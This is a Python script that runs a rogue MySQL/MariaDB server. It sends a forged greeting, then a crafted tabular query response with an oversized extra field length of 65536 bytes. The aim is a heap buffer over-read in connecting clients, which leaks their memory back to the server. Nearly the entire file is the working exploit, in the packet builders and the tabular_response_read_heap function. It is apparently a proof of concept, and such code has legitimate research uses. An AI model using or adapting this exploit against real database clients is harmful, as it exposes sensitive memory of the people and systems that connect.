#!/usr/bin/env python

import socket

ADDRESS = '127.0.0.1'
PORT = 3307


class Packet(dict):
    def __setattr__(self, name: str, value: str | bytes) -> None:
        self[name] = value

    def __repr__(self):
        return self.to_bytes()

    def to_bytes(self):
        return b"".join(v if isinstance(v, bytes) else bytes.fromhex(v) for v in self.values())


class MySQLPacketGen():

    @property
    def server_ok(self):
        sg = Packet()
        sg.full = "0700000200000002000000"

        return sg

    @property
    def server_greetings(self):
        sg = Packet()
        sg.packet_length =  "580000" 
        sg.packet_number =  "00" 
        sg.proto_version = "0a"
        sg.version = b'5.5.5-10.5.18-MariaDB\x00'
        sg.thread_id = "03000000"
        sg.salt = "473e3f6047257c6700"
        sg.server_capabilities = 0b1111011111111110.to_bytes(2, 'little')
        sg.server_language = "08" #latin1 COLLATE latin1_swedish_ci
        sg.server_status = 0b000000000000010.to_bytes(2, 'little')
        sg.extended_server_capabilities = 0b1000000111111111.to_bytes(2, 'little')
        sg.auth_plugin = "15"
        sg.unused = "000000000000"
        sg.mariadb_extended_server_capabilities = 0b1111.to_bytes(4, 'little')
        sg.mariadb_extended_server_capabilities_salt = "6c6b55463f49335f686c643100"
        sg.mariadb_extended_server_capabilities_auth_plugin = b'mysql_native_password'

        return sg

    @property
    def server_tabular_query_response(self):
        qr1 = Packet() #column count
        qr1.packet_length = "010000"
        qr1.packet_number = "01"
        qr1.field_count = "01"

        qr2 = Packet() #field packet
        qr2.packet_length = "180000" 
        qr2.packet_number = "02"
        qr2.catalog_length_plus_name = "0164"
        qr2.db_length_plus_name = "0164"
        qr2.table_length_plus_name = "0164"
        qr2.original_t = "0164"
        qr2.name_length_plus_name = "0164" 
        qr2.original_n = "0164" 
        qr2.canary = "0c"
        qr2.charset = "3f00"
        qr2.length = "0b000000"
        qr2.type = "03"
        qr2.flags = "0350"
        qr2.decimals = "000000"

        qr3 = Packet() #intermediate EOF
        qr3.full = "05000003fe00002200"

        qr4 = Packet() #row packet
        qr4.full = "0400000401350174"

        qr5 = Packet() #response EOF
        qr5.full = "05000005fe00002200"

        return (qr1, qr2, qr3, qr4, qr5)


class MySQLConn():
    def __init__(self, socket: socket):
        self.pg = MySQLPacketGen()
        self.conn, addr = socket.accept()
        print(f"[*] Connection from {addr}")

    def send(self, payload, message=None):
        print(f"[*] Sending {message}: {payload.hex()}")
        self.conn.send(payload)

    def read(self, bytes_len=1024):
        data = self.conn.recv(bytes_len)
        if (data):
            print(f"[*] Received {data.hex()}")

    def close(self):
        self.conn.close()

    def send_server_greetings(self):
        self.send(self.pg.server_greetings.to_bytes(), "Server Greeting")

    def send_server_ok(self):
        self.send(self.pg.server_ok.to_bytes(), "Server OK")

    def send_server_tabular_query_response(self):
        self.send(b''.join(s.to_bytes() for s in self.pg.server_tabular_query_response), "Tabular response")


def tabular_response_read_heap(m: MySQLConn):
    rh = m.pg.server_tabular_query_response

    # Length of the packet is modified to include the next added data
    rh[1].packet_length = "1e0000"

    # We add a length field encoded on 4 bytes which evaluates to 65536. If the process crashes because
    # the heap has been overread, lower this value.
    rh[1].extra_def_size = "fd000001"  # 65536

    # Filler
    rh[1].extra_def_data = "aa"

    trrh = b''.join(s.to_bytes() for s in rh)

    m.send_server_greetings()
    m.read()
    m.send_server_ok()
    m.read()
    m.send(trrh, "Malicious Tabular Response [Extract heap through buffer overread]")
    m.read(65536)


def main():
    with socket.create_server((ADDRESS, PORT), family=socket.AF_INET, backlog=1) as server:
        while(True):
            msql = MySQLConn(server)
            tabular_response_read_heap(msql)
            msql.close()


main()